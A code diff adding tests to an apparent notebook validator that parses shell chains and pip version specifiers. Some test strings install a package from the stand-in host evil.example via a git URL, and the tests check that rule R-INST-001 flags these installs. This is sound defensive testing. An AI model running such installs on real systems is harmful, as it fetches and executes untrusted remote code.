@@ -5204,3 +5204,113 @@ def test_a_substitution_reaches_a_function_its_parent_defined():
     assert ("!pip install a", True) in nv._split_chained(
         "!f(){ pip install a; }; echo ${READY:-$(f)}"
     )
+
+
+def test_a_condition_that_fails_whatever_pip_does_stays_known():
+    """`if false && pip install x` is known to fail, so its `else` certainly runs.
+
+    Marking the condition assumed merely because pip appears in it turned that certainty into
+    a guess, and the install bash always performs dropped out of the replay.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!if false && pip install x; then :; else pip install torchcodec==0.11; fi",
+        "!if pip install x && false; then :; else pip install torchcodec==0.11; fi",
+    ):
+        assert ("!pip install torchcodec==0.11", False) in nv._split_chained(cell), cell
+    # The assumption still counts where it really decides the condition: this body runs
+    # exactly when the install fails, and R-INST-001 has to see the source in it.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!if ! pip install x; then pip install git+https://evil.example/x.git; fi",
+            "nb.ipynb",
+            0,
+        )
+    ] == ["R-INST-001"]
+
+
+def test_a_path_qualified_prefix_runs_the_same_program():
+    """`/usr/bin/env pip install ...` installs exactly as the bare `env` form does.
+
+    Stopping at the path left the invocation invisible to every install rule, R-INST-001
+    included.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!pip install requests; /usr/bin/env pip install git+https://evil.example/repo.git"
+    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
+        ["requests"],
+        ["git+https://evil.example/repo.git"],
+    ]
+    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
+    # Still not a function call, since a path names a file rather than a shell function.
+    assert nv._split_chained("!f(){ pip install a; }; /usr/bin/env f") == [("!f", False)]
+
+
+def test_a_literal_return_status_propagates_out_of_a_function():
+    """`help return`: `return N` exits the function with N.
+
+    Reading it as unknown left `setup() { return 0; }; setup && pip install ...` conditional
+    and dropped an install that always runs.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert ("!pip install torch==2.11", False) in nv._split_chained(
+        "!setup() { return 0; }; setup && pip install torch==2.11"
+    )
+    assert ("!pip install torch==2.11", True) in nv._split_chained(
+        "!setup() { return 1; }; setup && pip install torch==2.11"
+    )
+    # A bare `return` carries the previous command's status, which nothing here names.
+    assert ("!pip install torch==2.11", True) in nv._split_chained(
+        "!setup() { maybe; return; }; setup && pip install torch==2.11"
+    )
+
+
+def test_a_prerelease_sorts_below_the_release_it_leads_up_to():
+    """PEP 440 puts `0.12.0rc1` under `0.12.0`, and `dev` under `a` under `b` under `rc`.
+
+    Reading the suffix's digits as another release component sorted the candidate ABOVE its
+    own release, so a floor the cell upgrades past looked already met.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv.cmp_versions("0.12.0rc1", "0.12.0") == -1
+    assert nv.cmp_versions("0.12.0rc1", "0.11.9") == 1
+    assert nv.cmp_versions("0.12.0rc1", "0.12.0rc2") == -1
+    assert nv.cmp_versions("0.12.0.dev1", "0.12.0a1") == -1
+    assert nv.cmp_versions("0.12.0a1", "0.12.0b1") == -1
+    # Release cores still compare as before, local versions and zero padding included.
+    assert nv.cmp_versions("0.11", "0.11.0") == 0
+    assert nv.cmp_versions("2.11.0+cu128", "2.11.0") == 0
+    # So a floor the release candidate sits below moves it.
+    assert nv._effective_version(
+        "!pip install torchcodec==0.12.0rc1\n!pip install 'torchcodec>=0.12.0'",
+        "torchcodec",
+        "0.11.0",
+    ) == ("0.12.0", False)
+
+
+def test_a_negation_covers_the_whole_pipeline():
+    """Bash negates a pipeline's status, not its first command's.
+
+    `! true | false` succeeds, so the `&&` behind it runs; losing the `!` at the pipe read
+    every one of these backwards.
+    """
+    nv = _load_notebook_validator_module()
+
+    runs = ("!! true | false && pip install a", "!true | true && pip install a")
+    skips = (
+        "!! true | true && pip install a",
+        "!! ! true | false && pip install a",
+        "!true | false && pip install a",
+        "!! false | true && pip install a",
+    )
+    for cell in runs:
+        assert ("!pip install a", False) in nv._split_chained(cell), cell
+    for cell in skips:
+        assert ("!pip install a", True) in nv._split_chained(cell), cell
+    # The fallback side reads the same status: a pipeline that succeeds skips its `||`.
+    assert ("!pip install a", True) in nv._split_chained("!! true | false || pip install a")
